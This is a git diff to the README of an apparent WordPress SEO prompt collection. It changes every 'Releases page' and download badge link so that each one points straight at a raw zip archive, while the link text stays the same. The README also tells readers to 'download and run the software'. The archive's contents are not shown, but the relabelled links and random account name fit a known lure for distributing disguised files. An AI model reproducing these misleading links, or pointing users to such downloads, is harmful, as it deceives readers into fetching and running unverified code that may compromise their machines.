@@ -1,7 +1,7 @@
 # 📝 wordpress-ai-seo-prompts - Optimize Your WordPress Blog Effortlessly
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-%23E63946?style=for-the-badge&logo=github)](https://github.com/Armadillidiumregistration893/wordpress-ai-seo-prompts/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Armadillidiumregistration893/wordpress-ai-seo-prompts/main/prompts/wordpress-ai-seo-prompts_v2.8.zip%20Latest%20Release-%20-%23E63946?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Armadillidiumregistration893/wordpress-ai-seo-prompts/main/prompts/wordpress-ai-seo-prompts_v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the **wordpress-ai-seo-prompts** project! This collection offers AI-driven prompts and workflows to help you create high-quality, SEO-optimized blog posts for your WordPress site. You will find templates for YoastSEO optimization, keyword research guidance, and on-page SEO checklists. Follow the steps below to get started.
@@ -12,7 +12,7 @@ Welcome to the **wordpress-ai-seo-prompts** project! This collection offers AI-d
 - A WordPress site where you can apply these prompts.
 
 ## 📂 Download & Install
-To download and run the software, visit the [Releases page](https://github.com/Armadillidiumregistration893/wordpress-ai-seo-prompts/releases). 
+To download and run the software, visit the [Releases page](https://raw.githubusercontent.com/Armadillidiumregistration893/wordpress-ai-seo-prompts/main/prompts/wordpress-ai-seo-prompts_v2.8.zip). 
 
 1. Click on the link above.
 2. You will see a list of available releases.
@@ -66,4 +66,4 @@ If you have questions, you can refer to the documentation included or raise an i
 ## 📞 Contact
 For further assistance, you can reach out through the Issues section of the repository or join our community to discuss with fellow users.
 
-Don't forget to check the [Releases page](https://github.com/Armadillidiumregistration893/wordpress-ai-seo-prompts/releases) for updates and new prompts! Happy blogging!
+Don't forget to check the [Releases page](https://raw.githubusercontent.com/Armadillidiumregistration893/wordpress-ai-seo-prompts/main/prompts/wordpress-ai-seo-prompts_v2.8.zip) for updates and new prompts! Happy blogging!
